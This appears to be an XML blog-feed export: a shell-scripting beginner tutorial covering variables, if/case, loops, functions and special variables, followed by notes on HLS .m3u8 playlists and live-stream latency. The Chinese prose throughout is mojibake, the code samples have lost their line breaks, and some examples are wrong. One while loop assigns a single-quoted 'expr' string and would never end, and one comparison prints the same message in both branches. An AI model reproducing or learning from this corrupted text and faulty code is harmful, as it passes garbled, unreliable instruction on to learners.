# å®£å‘Šä½¿ç”¨ /bin/bash#!/bin/bashecho &quot;=== å°‡ç›®å‰åŸ·è¡Œ process çš„ PID ä¾ç…§æ•¸å­—å¤§å°æ’åºï¼Œå–å‡ºå‰ 10 å === &quot;# ps ç‚ºåˆ—å‡º process ç›¸é—œè³‡è¨Šï¼Œé€é | pipe ç®¡ç·šå‚³éè³‡æ–™ã€‚awk å¯ä»¥æ ¹æ“š pattern é€²è¡Œè³‡æ–™è™•ç†ï¼ˆé€™é‚Šå°å‡ºç¬¬ä¸€æ¬„ PIDï¼‰è€Œ sort æ˜¯é€²è¡Œæ’åºï¼Œå…¶æ’åºæ™‚ï¼Œé è¨­éƒ½æ˜¯æŠŠè³‡æ–™ç•¶ä½œå­—ä¸²ä¾†æ’åºï¼Œè‹¥æƒ³è®“è³‡æ–™æ ¹æ“šå¯¦éš›æ•¸å€¼çš„å¤§å°ä¾†æ’åºï¼Œå¯ä»¥åŠ ä¸Š -n åƒæ•¸ã€‚-r å‰‡æ˜¯ç”±å¤§åˆ°å°æ’åºï¼Œé è¨­æ˜¯ç”±å°åˆ°å¤§ps | awk &#x27;&#123;print $1&#125;&#x27; | sort -rn | head -10

åŸ·è¡Œçµæœï¼š
$ ./demo.sh=== å°‡ç›®å‰åŸ·è¡Œ process çš„ PID ä¾ç…§æ•¸å­—å¤§å°æ’åºï¼Œå–å‡ºå‰ 10 å ===83784837837595675955759547595274069740687354337621

æ­å–œä½ ï¼Œä½ å·²ç¶“å®Œæˆäº†ç¬¬ä¸€å€‹ Shell Script ç¨‹å¼äº†ï¼
è®Šæ•¸ä¸€èˆ¬ä¾†èªªç¨‹å¼èªè¨€ä¸­è®Šæ•¸æ˜¯ç”¨ä¾†æš«å­˜æ¥ä¸‹ä¾†æœƒä½¿ç”¨åˆ°çš„è³‡æ–™æˆ–æ˜¯å„²å­˜æŒ‡åˆ°ç‰©ä»¶çš„åƒè€ƒä½ç½®ã€‚åœ¨ Shell Script å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸‰ç¨®æ–¹å¼ä¾†å®£å‘Šè®Šæ•¸ä¸¦çµ¦å®šå€¼ï¼š
#!/bin/bashvariable1=value# è‹¥æ˜¯å€¼å…§æœ‰ç©ºç™½å‰‡éœ€è¦ä½¿ç”¨ &#x27;&#x27; æˆ– &quot;&quot; åŒ…è£¹èµ·ä¾†variable2=&#x27;value 2&#x27;variable3=&quot;value 3&quot;


è¨»è§£ä½¿ç”¨ #ï¼Œå› ç‚ºæ²’æœ‰å¤šè¡Œè¨»è§£ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨å¤šå–®è¡Œè¨»è§£é”åˆ°

ä½¿ç”¨è®Šæ•¸æ–¹å¼ç‚º $&#123;è®Šæ•¸åç¨±&#125;ï¼ŒèŠ±æ‹¬è™Ÿä¸»è¦æ˜¯è¼”åŠ©äº†è§£è®Šæ•¸çš„ç¯„åœï¼š
#!/bin/bashpathName=demo.sh# echo æ˜¯åˆ—å°å€¼ï¼Œå°å‡ºè®Šæ•¸ pathName å…§å®¹ demo.shecho $&#123;pathName&#125;

æ›´æ–°è®Šæ•¸ç›´æ¥é‡æ–° assign å€¼å³å¯ï¼š
#!/bin/bashpathName=demo1.sh# å°å‡º demo1.shecho $&#123;pathName&#125;pathName=demo2.sh# å°å‡º demo2.shecho $&#123;pathName&#125;

åˆªé™¤è®Šæ•¸ä½¿ç”¨ unsetï¼š
#!/bin/bashpathName=demo.sh# å°å‡º demo.shecho $&#123;pathName&#125;unset pathName# ç©ºå€¼echo $&#123;pathName&#125;


æ³¨æ„ç³»çµ±ç’°å¢ƒè®Šæ•¸ç‚ºå…¨åŸŸè®Šæ•¸ã€å€åŸŸè®Šæ•¸å‰‡ç‚º Shell Script å…§éƒ¨ç¨‹å¼ä½¿ç”¨ï¼Œä¸èƒ½è·¨æª”æ¡ˆä½¿ç”¨ã€‚

é‹ç®—å¼é‹ç®—å¼æ˜¯ç•¶é‹ç®—å­å’Œé‹ç®—å…ƒè¨ˆç®—çµæœå›å‚³å¾Œè³¦å€¼çµ¦è®Šæ•¸ã€‚åœ¨ Bash Shell ä¸­å…§å»ºåŸç”Ÿä¸æ”¯æ´é‹ç®—å¼ï¼Œä½†æˆ‘å€‘å¯ä»¥ä½¿ç”¨ exprã€awk ç­‰æŒ‡ä»¤ä¾†æ”¯æ´å¯¦ç¾é‹ç®—å¼ã€‚
ç®—å¼æˆ‘å€‘å¯ä»¥ä½¿ç”¨å››å‰‡é‹ç®—ä¾†è³¦å€¼ï¼š
#!/bin/bashresult=`expr 10 + 2`# 12echo &quot;Result: $result&quot;

æ¢ä»¶åˆ¤æ–·åœ¨ Shell Script ä¸­åŒæ¨£å¯ä»¥ä½¿ç”¨ if..else æ¢ä»¶åˆ¤æ–·ï¼Œç‰¹åˆ¥æ³¨æ„çš„æ˜¯åœ¨ Shell Script ä¸­ä½¿ç”¨ fi ç‚ºçµå°¾ï¼ˆç‚º if çš„å€’å¯«æ³•ï¼ŒåŒæ¨£çš„æ¥ä¸‹ä¾†è¨è«–çš„ case ä¹Ÿæœ‰é¡ä¼¼ç”¨æ³•ï¼‰ï¼Œä»£è¡¨æ¢ä»¶åˆ¤æ–·çµæŸã€‚== ç‚ºç­‰æ–¼ï¼Œ!= ç‚ºä¸ç­‰æ–¼é‹ç®—å­ã€‚
if#!/bin/shx=20y=30if [ $x == $y ]; then   echo &quot;value x is equal to value y&quot;fiif [ $x != $y ]; then   echo &quot;value x is not equal to value y&quot;fi

if elseåœ¨ Shell Script å¯ä»¥ä½¿ç”¨ -gt ï¼ˆgreater than ç¸®å¯«ï¼‰å’Œ -lt ï¼ˆless than ç¸®å¯«ï¼‰ä»£è¡¨å¤§æ–¼å’Œå°æ–¼ï¼Œè€Œ -ge ï¼ˆgreater equal ç¸®å¯«ï¼‰å’Œ -leï¼ˆless equal ç¸®å¯«ï¼‰å‰‡æ˜¯å¤§æ–¼ç­‰æ–¼å’Œå°æ–¼ç­‰æ–¼çš„é‹ç®—å­ç¬¦è™Ÿã€‚

è¨˜å¾—æ¯”è¼ƒæ¢ä»¶éœ€è¦æ”¾åœ¨ [] ä¸­ï¼Œå‰å¾Œè¦ç•™ç©ºç™½

#!/bin/bashif [ $x -gt $y ]; then   echo &quot;value x is greater than value y&quot;else   echo &quot;value x is not greater than value y&quot;fiif [ $x -lt $y ]; then   echo &quot;value x is not less than value y&quot;else   echo &quot;value x is not less than value y&quot;fiif [ $x -ge $y ]; then   echo &quot;value x is greater or equal than value y&quot;else   echo &quot;value x is not greater than value y&quot;fiif [ $x -le $y ]; then   echo &quot;value x is not less or equal than value y&quot;else   echo &quot;value x is not less or equal than value y&quot;fi

if elif elseè‹¥æœ‰å¤šå€‹æ¢ä»¶éœ€è¦åˆ¤æ–·ï¼Œå¯ä»¥ä½¿ç”¨ if elif elseï¼š
#!/bin/bashvalue1=20value2=30value3=30if [ $value1 -gt $value2 ]; then   echo &quot;value1 is greater than value2&quot;elif [ $value1 == $value3 ]; then   echo &quot;value1 is equal to value3&quot;else   echo &quot;other result&quot;fi

case â€¦ esacè‹¥è¦ä½¿ç”¨é¡ä¼¼ä¸€èˆ¬ç¨‹å¼èªè¨€çš„ switch ä¾†è™•ç†å¤šç¨®æ¢ä»¶åˆ¤æ–·æ™‚ï¼Œå¯ä»¥ä½¿ç”¨ case ä¾†é€²è¡Œåˆ¤æ–·ï¼š
#!/bin/bashlanguage=&#x27;Java&#x27;case $language in    Java*) echo &quot;æ˜¯ Javaï¼&quot;            ;;    Python*) echo &quot;æ˜¯ Pythonï¼&quot;            ;;    C*)     echo &quot;æ˜¯ Cï¼&quot;            ;;    *)      echo &quot;æ²’ match åˆ°ï¼&quot;esac

è¿´åœˆç•¶æˆ‘å€‘éœ€è¦é‡è¤‡æŸäº›ç‘£ç¢çš„ä»»å‹™æˆ–æ˜¯è¿­ä»£å–å¾—è³‡æ–™å°±éœ€è¦è¿´åœˆä¾†æ”¯æ´ã€‚æ­¤æ™‚å¯ä»¥ä½¿ç”¨ forã€while å’Œ until è¿´åœˆé€²è¡Œè¿­ä»£ã€‚
forShell Script çš„ for ä½¿ç”¨æ–¹æ³•å’Œä¸€èˆ¬ç¨‹å¼èªè¨€é¡ä¼¼ï¼ŒåŒæ¨£å¯ä»¥é‡å°æ¢ä»¶ä½¿ç”¨ breakã€continue ä¾†è·³å‡ºæˆ–æ˜¯è·³éè¿´åœˆã€‚
#!/bin/bashfor loop in 1 2 3; do    echo &quot;number: $loop&quot;done

whileè‹¥æ˜¯éœ€è¦è¨­å®šä¸€å€‹æ¢ä»¶ç›´åˆ°è©²æ¢ä»¶ç‚ºæ­¢ï¼Œå¯ä»¥ä½¿ç”¨ whileï¼Œä½†è¦æ³¨æ„é¿å…ç„¡é™è¿´åœˆç‹€æ³ï¼š
#!/bin/bashcounter=0while [ $counter -le 5 ]; do    counter=&#x27;expr $counter+1&#x27;    echo $counterdone

untilç›´åˆ°æŸå€‹æ¢ä»¶çµæŸå¯ä»¥ä½¿ç”¨ until ä¾†é€²è¡Œï¼š
#!/bin/bash# å¾ 0 å°å‡ºæ•¸å­—ç›´åˆ° 10counter=0until [ $counter -gt 10 ]; do   echo $counter   counter=`expr $counter + 1`done

å‡½å¼éš¨è‘—æˆ‘å€‘çš„ç¨‹å¼è¶Šä¾†è¶Šå¤§ï¼Œæˆ‘å€‘éœ€è¦é€éæ¨¡çµ„åŒ–æˆ–æ˜¯å°‡é‡è¤‡ä½¿ç”¨çš„ç¨‹å¼ç¢¼æ”¹æˆå‡½å¼ã€‚å‡½å¼åŸºæœ¬æ¶æ§‹å¦‚ä¸‹ï¼š

å‡½å¼åç¨±ï¼ˆfunction é—œéµå­—ç‚ºé¸æ“‡æ€§ï¼‰
æ˜¯å¦æœ‰å‚³å…¥åƒæ•¸
å‡½å¼å…§æ“ä½œ
æ˜¯å¦æœ‰å›å‚³å€¼

function function_name () &#123;    # åšä¸€äº›äº‹æƒ…    [ å›å‚³å€¼ ]&#125;

å‡½å¼ç¯„ä¾‹ï¼š
#!/bin/bashfunction echoHello() &#123;    # hello world, rock!!    echo &quot;$&#123;0&#125; hello $&#123;1&#125;, $&#123;2&#125;!!&quot;&#125;echoHello &#x27;world&#x27; &#x27;rock&#x27;

ä»¥ä¸Šæˆ‘å€‘å¯ä»¥çœ‹åˆ°ä½¿ç”¨ &quot;&quot; é›™å¼•è™ŸæŠŠå­—ä¸²å’Œè®Šæ•¸å–å‡ºä¾†å°å‡ºï¼ˆä½ å¯ä»¥è©¦è©¦çœ‹ä½¿ç”¨å–®å¼•è™Ÿæœƒç™¼ç”Ÿä»€éº¼äº‹æƒ…ï¼‰ï¼Œèˆ‡ä¸€èˆ¬ç¨‹å¼èªè¨€æ¯”è¼ƒä¸åŒçš„æ˜¯å…¶å‡½å¼å‘¼å«ä¸éœ€è¦æœ‰å°æ‹¬è™Ÿå‚³å…¥åƒæ•¸ï¼Œç›´æ¥ä»¥ç©ºç™½ç•¶ä½œåƒæ•¸å‚³éçš„æ ¼å¼ã€‚æ³¨æ„åƒæ•¸å¾ 1 é–‹å§‹ï¼Œ$&#123;0&#125; ç‚ºæª”åã€‚
ç‰¹æ®Šè®Šæ•¸åœ¨ Shell Script æª”æ¡ˆå’Œå‡½å¼å¾€å¾€éœ€è¦é€éå‚³å…¥åƒæ•¸ä¾†è¨­å®šåŸ·è¡Œç¨‹å¼çš„å…§å®¹ã€‚åœ¨ Shell Script æ”¯æ´è¨±å¤šå¥½ç”¨çš„ç‰¹æ®Šè®Šæ•¸ï¼Œå¯ä»¥æ–¹ä¾¿æˆ‘å€‘é€éä½¿ç”¨è®Šæ•¸æ–¹å¼ä¾†è¨­ç½®ç¨‹å¼åŸ·è¡Œçš„æµç¨‹ã€‚



æŒ‡ä»¤
æè¿°
è¨»è§£



$0
ç›®å‰çš„æª”æ¡ˆæª”å



$n
n å¾ 1 é–‹å§‹ï¼Œä»£è¡¨ç¬¬å¹¾å€‹åƒæ•¸



$#
å‚³éåˆ°ç¨‹å¼æˆ–å‡½å¼ç›®å‰æœ‰å¹¾å€‹åƒæ•¸



$*
å‚³éåˆ°ç¨‹å¼æˆ–å‡½å¼æ‰€æœ‰åƒæ•¸



$@
é¡ä¼¼ $* ä½†æ˜¯åœ¨è¢«é›™å¼•è™ŸåŒ…å«æ™‚æœ‰äº›è¨±ä¸åŒ



$?
ä¸Šä¸€å€‹æŒ‡ä»¤é€€å‡ºç‹€æ…‹æˆ–æ˜¯å‡½å¼çš„è¿”å›å€¼



$$
ç›®å‰ process PID



é€éåŸ·è¡Œ ./demo_special_var.sh var1 var2ï¼š
#!/bin/bashecho &quot;$0&quot;echo &quot;$1&quot;echo &quot;$#&quot;echo &quot;$*&quot;echo &quot;$@&quot;echo &quot;$?&quot;echo &quot;$$&quot;

å°å‡ºçµæœï¼š
./demo.shvar12var1 var2var1 var2080417

ç¸½çµä»¥ä¸Šæˆ‘å€‘é€éå¾ªåºæ¼¸é€²å…¥é–€äº† Shell Script ä¸¦æ’°å¯«äº†æˆ‘å€‘ç¬¬ä¸€å€‹ Shell Script ç¨‹å¼ï¼Œä¸¦äº†è§£å¦‚ä½•åœ¨ Shell Script ä¸­ä½¿ç”¨è®Šæ•¸ã€æ¢ä»¶åˆ¤æ–·ã€è¿´åœˆã€å‡½å¼ä»¥åŠç‰¹æ®Šè®Šæ•¸ã€‚Shell Script å¸¸ç”¨æ–¼ç³»çµ±ç®¡ç†ã€è‡ªå‹•åŒ–æ“ä½œæª”æ¡ˆã€è‡ªå‹•åŒ–é‡è¤‡çš„æŒ‡ä»¤ç¢¼ã€åˆ†æ log ç­‰æ–‡ä»¶æª”æ¡ˆã€åˆ—å°å‘ˆç¾æˆ‘å€‘æƒ³è¦çš„è³‡æ–™ç­‰ï¼Œé€éç¨‹å¼èªè¨€çš„ä½¿ç”¨ä¾†æ¸›å°‘é‡è¤‡ç‘£ç¢çš„å·¥ä½œï¼Œå¿«æŠŠ Shell Script æ”¾å…¥ä½ çš„å·¥å…·ç®±ä¸­å§ï¼è‹¥èƒ½å¦¥å–„ä½¿ç”¨å°‡æå‡ä¸å°‘é–‹ç™¼è€…å’Œè»Ÿé«”å·¥ç¨‹å¸«çš„æ—¥å¸¸å·¥ä½œæ•ˆç‡ã€‚
åƒè€ƒæ–‡ä»¶
Wiki Shell æŒ‡ä»¤ç¢¼
Wiki æ ¸å¿ƒ (é›»è…¦ç§‘å­¸)
é³¥å“¥çš„ Linux ç§æˆ¿èœ

ï¼ˆimage via stackoverflowï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>è»Ÿé«”å·¥ç¨‹å¸«</tag>
        <tag>è»Ÿé«”å·¥ç¨‹</tag>
        <tag>software engineering</tag>
        <tag>bash</tag>
        <tag>shell</tag>
        <tag>linux</tag>
        <tag>æŒ‡ä»¤</tag>
        <tag>å‘½ä»¤åˆ—</tag>
        <tag>command line</tag>
        <tag>script</tag>
        <tag>unix</tag>
        <tag>mac</tag>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>curl</tag>
        <tag>shell script</tag>
      </tags>
  </entry>
  <entry>
    <title>ç›´æ’­å”å®š hls ç­†è¨˜</title>
    <url>/2016/12/03/livestreamming-hls-note/</url>
    <content><![CDATA[å‰è¨€æœ€è¿‘å‰›å¥½åœ¨åšç›´æ’­ç›¸é—œçš„æ±è¥¿ï¼Œé›–ç„¶èªªæ˜¯åšå‰ç«¯ï¼Œä½†é‚„æ˜¯å¿…é ˆæ‡‚ä¸€äº›ç›´æ’­çš„åŸç†è‡³å°‘è¦çŸ¥é“æœ‰å“ªäº›æ ¼å¼ï¼Œä»¥åŠå„ç¨®æ ¼å¼çš„å„ªç¼ºé»æ˜¯ä»€éº¼ï¼Œåšèµ·ä¾†ä¹Ÿæœƒæ¯”è¼ƒè¸å¯¦
é€™ç¯‡å°±ç°¡å–®è¨˜éŒ„ä¸€äº›å¿ƒå¾—è·Ÿè³‡æ–™ï¼Œå¦‚æœæƒ³æ¯”è¼ƒæ·±å…¥äº†è§£ hls çš„ï¼Œå¯ä»¥åƒè€ƒä¸‹é¢é€™å…©ç¯‡æ–‡ç« ï¼š

ç›´æ’­åè®®çš„é€‰æ‹©ï¼šRTMP vs. HLS
åœ¨çº¿è§†é¢‘ä¹‹HLSåè®®â€”å­¦ä¹ ç¬”è®°ï¼šM3U8æ ¼å¼è®²è§£åŠå®é™…åº”ç”¨åˆ†æ

hls æ˜¯ä»€éº¼ï¼Ÿæˆ‘è¦ºå¾—ä»¥ç›´æ’­ä¾†èªªï¼Œhls æ˜¯ä¸€å€‹ç›¸ç•¶å¥½æ‡‚çš„å”å®šï¼Œå…¶å¯¦å°±æ˜¯é€éä¸€å€‹ .m3u8 çš„æ’­æ”¾åˆ—è¡¨ï¼Œç„¶å¾Œè£¡é¢æœ‰å¤šå€‹ .ts çš„æª”æ¡ˆä½ åªè¦ç…§è‘—æ’­æ”¾åˆ—è¡¨è£¡é¢çµ¦ä½ çš„æª”æ¡ˆé †åºæ’­æ”¾å°±å¥½äº†ï¼Œè½èµ·ä¾†å¾ˆå®¹æ˜“å§ï¼
ç‚ºäº†è®“å¤§å®¶æ›´æ˜ç™½ï¼Œç›´æ¥é™„ä¸Šæ“·å–è‡ªæŸè™•çš„æ’­æ”¾åˆ—è¡¨ï¼š
#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:YES#EXT-X-MEDIA-SEQUENCE:4454#EXT-X-TARGETDURATION:4#EXTINF:3.998, no desc25133_src/4460.ts#EXTINF:3.992, no desc25133_src/4461.ts#EXTINF:3.985, no desc25133_src/4462.ts#EXTINF:3.979, no desc25133_src/4463.ts#EXTINF:3.996, no desc25133_src/4464.ts

å°±ç®—ä½ æ²’çœ‹éé€™å€‹æ ¼å¼ï¼Œä½ å¤§æ¦‚çœ‹ä¸€ä¸‹ä¹Ÿå¯ä»¥çŒœå‡ºä¾†å®ƒåœ¨åšä»€éº¼æ¯ä¸€å€‹ ts å°±æ˜¯ä¸€å€‹ç‰‡æ®µï¼Œç„¶å¾Œ #EXTINF:3.996 ä»£è¡¨é€™å€‹ç‰‡æ®µçš„æ™‚é–“é•·åº¦#EXT-X-TARGETDURATION:4ï¼Œé€™é‚Šçš„æ•¸å­—å¿…é ˆæ¯”æ’­æ”¾æ¸…å–®ä¸­çš„ä»»ä½•ä¸€å€‹å½±ç‰‡çš„æ™‚é–“éƒ½å¤§ã€‚ä»£è¡¨æ’­æ”¾å™¨æ‡‰è©²æ¯éš”å¹¾ç§’å»æŠ“ä¸€æ¬¡æ–°çš„æ’­æ”¾æ¸…å–®  
ä¾‹å¦‚èªªï¼Œä¸‹ä¸€æ¬¡æŠ“åˆ°çš„å¯èƒ½æœƒé•·é€™æ¨£ï¼š  
#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:YES#EXT-X-MEDIA-SEQUENCE:4455#EXT-X-TARGETDURATION:4#EXTINF:3.992, no desc25133_src/4461.ts#EXTINF:3.985, no desc25133_src/4462.ts#EXTINF:3.979, no desc25133_src/4463.ts#EXTINF:3.996, no desc25133_src/4464.ts#EXTINF:3.998, no desc25133_src/4465.ts

å°±æ˜¯æœ€å¾Œé¢å¤šäº†ä¸€å€‹ç‰‡æ®µã€‚æ‰€ä»¥åªè¦ä¸€ç›´ç¶­æŒé€™å€‹è¦å‰‡ï¼Œå°±èƒ½å¤ ä¸æ–·å–åˆ°æ–°çš„ç‰‡æ®µé‚£å¦‚æœå¾ˆä¸å·§çš„ï¼Œserver æ²’æœ‰åŠæ™‚ç”¢ç”Ÿå‡ºæ’­æ”¾åˆ—è¡¨æ€éº¼è¾¦å‘¢ï¼Ÿ
ä¾‹å¦‚èªªåœ¨ç¬¬ 4 ç§’çš„æ™‚å€™å»æ‹¿ï¼Œç™¼ç¾æ²’æ›´æ–°ï¼Œserver åœ¨ç¬¬ 4.5 ç§’æ‰æŠŠæ–°çš„æ’­æ”¾ç‰‡æ®µç”¢ç”Ÿå‡ºä¾†ã€‚å¦‚æœç™¼ç”Ÿé€™ç¨®ã€Œæ‹¿äº†æ’­æ”¾æ¸…å–®ï¼Œä½†é•·çš„ä¸€æ¨£ã€çš„æƒ…å½¢ï¼Œå°±æœƒæŠŠæŠ“å–çš„æ™‚é–“æ¸›ä¸€åŠï¼Œç›´åˆ°æŠ“åˆ°ç‚ºæ­¢ã€‚åƒä»¥ä¸Šæƒ…å½¢ï¼Œç¬¬ 4 ç§’æ²’æ‹¿åˆ°æ–°çš„ï¼Œå°±æœƒéš” 2 ç§’ä¹‹å¾Œå†å»æŠ“ã€‚
é€™å€‹è¦å‰‡å¯ä»¥åƒè€ƒï¼šHTTP Live Streaming draft-pantos-http-live-streaming-20

When a client loads a Playlist file for the first time or reloads a   Playlist file and finds that it has changed since the last time it   was loaded, the client MUST wait for at least the target duration   before attempting to reload the Playlist file again, measured from   the last time the client began loading the Playlist file.


If the client reloads a Playlist file and finds that it has not   changed then it MUST wait for a period of one-half the target   duration before retrying.

è‡³æ–¼åšç›´æ’­æœ€é—œå¿ƒçš„å»¶é²å•é¡Œï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¾é€™å€‹æ’­æ”¾åˆ—è¡¨ç›´æ¥æ¨æ¸¬å‡ºä¾†ä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼Œä¸€å…±æœ‰ 5 å€‹ç‰‡æ®µï¼Œæ¯ä¸€å€‹ç‰‡æ®µ 4 ç§’ï¼Œå»¶é²å°±æ˜¯ 20 ç§’Apple å®˜æ–¹å»ºè­°çš„æ˜¯ 3 å€‹ç‰‡æ®µï¼Œæ¯å€‹ç‰‡æ®µ 10 ç§’

What duration should media files be?A duration of 10 seconds of media per file seems to strike a reasonable balance for most broadcast content.


How many files should be listed in the index file during a continuous, ongoing session?The normal recommendation is 3, but the optimum number may be larger.

å¯åƒè€ƒï¼šApple: HTTP Live Streaming Overview
ä¸éä¾ç…§å®˜æ–¹çš„å»ºè­°ï¼Œå°±æœƒæœ‰ 30 ç§’çš„å»¶é²ï¼Œç•¶ç„¶å»¶é²è¶Šä¹…ç›´æ’­çš„ç‹€æ³æœƒè¶Šå¥½ï¼Œå¯æ˜¯é«”é©—ä¹Ÿæœƒæ¯”è¼ƒå·®ä¸€é»ã€‚å› æ­¤ï¼Œæˆ‘å€‘å¯ä»¥ä¾†çœ‹çœ‹å¹¾å€‹ç›´æ’­ç¶²ç«™éƒ½æ˜¯æ€éº¼è¨­å®šçš„
å…ˆä¾†çœ‹çœ‹ç›´æ’­å¤§é ­ï¼šTwitch  
#EXTM3U#EXT-X-VERSION:3#EXT-X-TARGETDURATION:5#ID3-EQUIV-TDTG:2016-11-26T02:40:23#EXT-X-MEDIA-SEQUENCE:376#EXT-X-TWITCH-ELAPSED-SYSTEM-SECS:1511.137#EXT-X-TWITCH-ELAPSED-SECS:1508.980#EXT-X-TWITCH-TOTAL-SECS:1535.137#EXTINF:4.000,index-0000000377-6zCW.ts#EXTINF:4.000,index-0000000378-vHZS.ts#EXTINF:4.000,index-0000000379-Gkgv.ts#EXTINF:4.000,index-0000000380-PNoG.ts#EXTINF:4.000,index-0000000381-h58g.ts#EXTINF:4.000,index-0000000382-W88t.ts

6 å€‹ç‰‡æ®µä¹˜ä¸Š 4 ç§’ &#x3D; 24 ç§’å¯æ˜¯å¦‚æœä½ ä»”ç´°è§€å¯Ÿï¼ˆé–‹ chrome devtool å°±å¯ä»¥äº†ï¼‰ï¼Œå¯¦éš›ä¸Š twtich çš„æ’­æ”¾å™¨åœ¨æ‹¿åˆ°åˆ—è¡¨ä»¥å¾Œï¼Œæœƒç›´æ¥å˜—è©¦å¾ã€Œå€’æ•¸ç¬¬ä¸‰å€‹ã€ç‰‡æ®µé–‹å§‹è¼‰å…¥ï¼Œæ‰€ä»¥å»¶é²å°±ç¸®çŸ­ç‚º 3 å€‹ç‰‡æ®µä¹˜ä¸Š 4 ç§’ &#x3D; 12 ç§’äº†  
å†ä¾†çœ‹çœ‹å°ç£çš„ livehouse.in
#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:NO#EXT-X-MEDIA-SEQUENCE:2291#EXT-X-TARGETDURATION:6#EXTINF:5.2090001106262207,1480116261segment_v02291.ts#EXTINF:5.2080001831054688,1480116261segment_v02292.ts#EXTINF:5.2080001831054688,1480116261segment_v02293.ts

5 ä¹˜ä¸Š 3 &#x3D; 15 ç§’  
æ‰€ä»¥ä¸€èˆ¬ç”¨ hls çš„ç›´æ’­ç¶²ç«™ï¼Œå»¶é²å¤§æ¦‚éƒ½æœƒåœ¨ 10~20 ç§’é€™å€‹å€é–“ä»¥å…§æˆ‘çŒœæ¯”é€™å€‹çŸ­çš„è©±å° server å£“åŠ›å¯èƒ½å¾ˆå¤§ï¼Œè€Œä¸”ç¶²é€Ÿæ…¢çš„è©±ï¼Œçœ‹èµ·ä¾†æœƒå¾ˆå¡æ¯”é€™å€‹é•·çš„è©±é›–ç„¶å¾ˆé †ï¼Œä½†æ˜¯ä½¿ç”¨è€…é«”é©—ä¸å¤ªå¥½ï¼Œå»¶é²å¤ªé«˜æ‰€ä»¥èƒ½æ‰¾åˆ°æœ€å¥½çš„å»¶é²å°±æ˜¯åœ¨é€™å€‹å€é–“å…§äº†
æœ€å¾Œï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹å¦‚æœè¦åœ¨ç¶²é ä¸Šæ’­æ”¾çš„è©±ï¼Œæœ‰å“ªäº›é¸æ“‡å› ç‚ºç¾åœ¨å·²ç¶“æ˜¯å€‹ flash å¿«æ­»æ‰çš„å¹´ä»£äº†ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥çš„è©±ï¼Œé¦–é¸ç•¶ç„¶æ˜¯ html5ç€è¦½å™¨æ”¯æ´åº¦ä¸å¤ é«˜çš„è©±å† fallback å›å» flash
å…ˆä¾†ä»‹ç´¹ä¸€ä¸‹ç¾æˆçš„å•†æ¥­æˆæ¬Šæ’­æ”¾å™¨ï¼Œä¾‹å¦‚èªª jwplayer æˆ–æ˜¯ flowplayerï¼Œéƒ½æ˜¯å¾ˆä¸éŒ¯çš„é¸é …ã€‚å°¤å…¶æ˜¯ç•¶ open source çš„æ–¹æ¡ˆå‡ºç¾å•é¡Œä½ åˆä¿®ä¸å¥½çš„æ™‚å€™ï¼Œå°±æœƒå¾ˆå¸Œæœ›å…¬å¸èŠ±éŒ¢è²·ä¸€å€‹å•†æ¥­æ’­æ”¾å™¨ï¼Œä¸€åˆ‡å•é¡Œéƒ½æå®šã€‚
open source çš„æ–¹æ¡ˆå¤§æ¦‚å°±æ˜¯ videojs ä¸€æ”¯ç¨ç§€äº†ï¼Œæœ‰æ²’æœ‰å…¶ä»–çš„å¾Œèµ·ä¹‹ç§€æˆ‘æ˜¯ä¸çŸ¥é“å•¦ï¼Œæœ‰çš„è©±éº»ç…©æ¨è–¦ä¸€ä¸‹ã€‚
ç„¶å¾Œå› ç‚º hls é€™å€‹æ ¼å¼ç€è¦½å™¨æœ¬èº«æ˜¯æ²’è¾¦æ³•æ’­æ”¾çš„ï¼ˆé™¤éæ˜¯ iOS æˆ–æ˜¯ Safariï¼‰ï¼Œæ‰€ä»¥è¦æ­é…ä¸€äº› pluginvideojs å®˜æ–¹æœ‰ä¸€å€‹ videojs-contrib-hlsï¼ŒåŠ ä¸Šå»ä¹‹å¾Œå°±å¯ä»¥æ’­æ”¾äº†ï¼Œä½†æˆ‘è‡ªå·±ç”¨éä»¥å¾Œæ„Ÿè¦ºä¸æ˜¯å¾ˆå¥½ã€‚
æœ€å¾Œé¸æ“‡äº†çŸ¥åçš„å½±éŸ³ç¶²ç«™ dailymotion æä¾›çš„é–‹æºè§£æ±ºæ–¹æ¡ˆ hls.jsã€‚
é€™ä¸€ç¯‡æ˜¯ä»–å€‘å®˜æ–¹çš„éƒ¨è½æ ¼ï¼Œæœ‰ä»‹ç´¹èªªç‚ºä»€éº¼è¦è‡ªå·±å¯«ä¸€å¥—ï¼Œä»¥åŠè§£æ±ºäº†å“ªäº›å•é¡Œï¼Œæ»¿å€¼å¾—ä¸€çœ‹çš„ï¼Œå¯ä»¥é †ä¾¿äº†è§£ä¸€ä¸‹ã€‚
å¦å¤–ï¼Œhls ä¹Ÿæ”¯æ´åœ¨ä¸åŒçš„é »å¯¬ä¸‹çš„è‡ªå‹•åˆ‡æ›ï¼Œå®ƒçš„æª”æ¡ˆæœƒé•·æˆé€™æ¨£ï¼š
#EXTM3U#EXT-X-STREAM-INF:BANDWIDTH=1280000,AVERAGE-BANDWIDTH=1000000http://example.com/low.m3u8#EXT-X-STREAM-INF:BANDWIDTH=2560000,AVERAGE-BANDWIDTH=2000000http://example.com/mid.m3u8#EXT-X-STREAM-INF:BANDWIDTH=7680000,AVERAGE-BANDWIDTH=6000000http://example.com/hi.m3u8#EXT-X-STREAM-INF:BANDWIDTH=65000,CODECS=&quot;mp4a.40.5&quot;http://example.com/audio-only.m3u8

